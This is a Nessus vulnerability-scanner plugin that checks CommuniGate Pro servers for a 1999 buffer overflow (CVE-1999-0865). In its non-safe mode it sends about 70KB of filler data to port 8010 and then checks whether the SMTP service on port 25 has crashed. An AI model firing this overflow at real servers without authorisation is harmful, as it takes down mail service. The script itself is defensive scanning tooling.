#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10048);
 script_bugtraq_id(860);
 script_version ("$Revision: 1.16 $");
 script_cve_id("CVE-1999-0865");
 name["english"] = "Communigate Pro overflow";
 name["francais"] = "Overflow de Communigate Pro";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It was possible to overflow the remote Communigate
Pro server by :

	- connecting to port 8010 and sending
	  70Kb of data (AAA[...]AAA) followed
	  by a carriage return (\r\n)
	  
	- then connecting to port 25
	
An attacker may use this problem to execute arbitrary
code on this system. He can also use this flaw to
prevent you from receiving emails.


Solution : install version 3.2 or above
Risk factor : High";


 desc["francais"] = "
Il s'est avéré possible de faire un overflow dans
le server communigate distant en :

	- s'y connectant au port 8010 et en
	  y envoyant 70Kb de données
	 
	- puis se connecter au port 25
	
Un pirate peut utiliser ce problème pour éxecuter
du code arbitraire sur ce système. Il peut aussi
l'utiliser pour empecher votre messagerie de fonctionner

Solution : Installez la version 3.2 ou plus récente
Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote service";
 summary["francais"] = "Fait planter le service distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_MIXED_ATTACK); # mixed
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports(8010);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");

if(safe_checks())
{
 banner = get_http_banner(port:8010);
 
 if(banner)
  {
  if(egrep(pattern:"^Server: CommuniGatePro/3\.[0-1]",
  	  string:banner))
	  {
	   alrt = "
The remote CommuniGatePro server may be vulnerable
to a buffer overflow which could allow an attacker
to shut this service down.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution : Upgrade to Communigate 3.2 or newer
Risk factor : High";
	   security_hole(port:8010, data:alrt);
	  }
  }
 exit(0);
}


if(get_port_state(8010))
{
 if(get_port_state(25))
 {
 soc25 = open_sock_tcp(25);
 if(soc25)
 {
  r = recv_line(socket:soc25, length:1024);
  if(!r)exit(0);
  close(soc25);
  soc = open_sock_tcp(8010);
  if(soc)
  {
  data = crap(1024);
  end = string("\r\n");
  for(i=0;i<70;i=i+1)
  {
  send(socket:soc, data:data);
  }
  send(socket:soc, data:end);
  r = http_recv(socket:soc);
  close(soc);
 
  soc25 = open_sock_tcp(25);
  rep = recv_line(socket:soc25, length:1024);
  if(!rep)security_hole(8010);
  close(soc25);
   }
  }
 }
}
